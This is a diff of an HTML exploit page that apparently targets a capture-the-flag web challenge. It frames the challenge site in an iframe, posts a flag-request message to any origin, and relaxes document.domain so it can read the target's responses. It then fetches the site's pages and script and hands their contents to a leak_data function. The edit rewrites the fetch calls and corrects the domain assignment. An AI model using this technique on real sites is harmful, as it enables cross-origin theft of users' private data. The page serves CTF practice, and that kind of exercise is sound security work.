@@ -16,13 +16,12 @@
                 });
                 let target = document.getElementById("target");
                 target.contentWindow.postMessage("NOTE_APP_FLAG_REQUEST", "*");
-                leak_data((await fetch("https://chall1.jsapi.tech")).text);
-                leak_data((await fetch("https://chall1.jsapi.tech/script.js")).text);
+                fetch("https://chall1.jsapi.tech").then((response) => {leak_data(response.text);});
+                fetch("https://chall1.jsapi.tech/script.js").then((response) => {leak_data(response.text);});
             }
-            document.domain = "chall1.jsapi.tech";
         </script>
     </head>
-    <body onload="document.domain = 'https://chall1.jsapi.tech'">
+    <body onload="document.domain = 'chall1.jsapi.tech'">
         <iframe id="target" src="https://chall1.jsapi.tech/?enableapi=true&recv=https://ctf0.chall1.jsapi.tech/" onload="start_attack()"></iframe>
     </body>
 </html>
